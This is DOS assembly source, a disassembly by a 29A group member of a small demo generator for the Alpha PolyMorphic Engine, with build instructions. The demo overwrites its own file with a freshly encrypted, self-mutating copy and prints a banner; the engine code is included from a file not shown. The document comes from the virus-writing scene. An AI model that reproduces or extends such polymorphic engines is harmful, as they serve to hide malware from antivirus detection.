   ; comment *
   ;                              APME.Demo.620             ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;                              Disassembly by            ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;                               Darkman/29A               ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;                                                        ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;                                                        ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ
   ;
   ;   APME.Demo.620 is a 620 bytes generator. Generates a new copy of itself, when
   ;   executed. APME.Demo.620 is polymorphic in file using Alpha PolyMorphic
   ;   Engine v 1.04b [APME].
   ;
   ;   I would like to thank Lookout Man for providing me the binary of this
   ;   generator.
   ;
   ;   To compile APME.Demo.620 with Turbo Assembler v 5.0 type:
   ;     TASM /M APME.ASM
   ;     TLINK /t /x APME.OBJ
   ; *

   .model tiny
   .code
    org   100h              ; Origin of APME.Demo.620

   code_begin:
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            call    delta_offset
   delta_offset:
            pop     si          ; Load SI from stack
            sub     si,offset delta_offset

            mov     ax,100h         ; AX = delta offset
            push    ax          ; Save AX at stack

            mov     ax,200h         ; AX = maximum length of decryptor
            push    ax          ; Save AX at stack

            mov     ax,(code_end-code_begin)
            push    ax          ; Save AX at stack

            push    cs          ; Save CS at stack
            lea     ax,[si+code_begin]  ; AX = offset of code_begin
            push    ax          ; Save AX at stack

            push    cs          ; Save CS at stack
            lea     ax,[si+code_end]    ; AX = offset of code_end
            push    ax          ; Save AX at stack

            call    apme_poly
            sub     sp,0eh      ; Subtract fourteen from stack poi...

            push    ax          ; Save AX at stack
            mov     ax,3d02h        ; Open file (read/write)
            lea     dx,[si+filename]    ; DX = offset of filename
            int     21h
            mov     bx,ax       ; BX = file handle

            pop     cx          ; Load CX from stack (AX)
            lea     dx,[si+code_end]    ; DX = offset of code_end
            mov     ah,40h      ; Write to file
            int     21h

            xor     cx,cx       ; Truncate file
            mov     ah,40h      ; Write to file
            int     21h

            mov     ah,3eh      ; Close file
            int     21h

            lea     dx,[si+message]     ; DX = offset of message
            mov     ah,09h      ; Write string to standard output
            int     21h

            mov     ax,4c00h        ; Terminate with return code
            int     21h

   filename     db      'apme.com',00h      ; Filename
   message      db      '[àPME] Alpha PolyMorphic Engine by ViKing - Version 1.04b$'

   include      apmepoly.asm        ; Include Alpha PolyMorphic Engine...
   code_end:

   end      code_begin
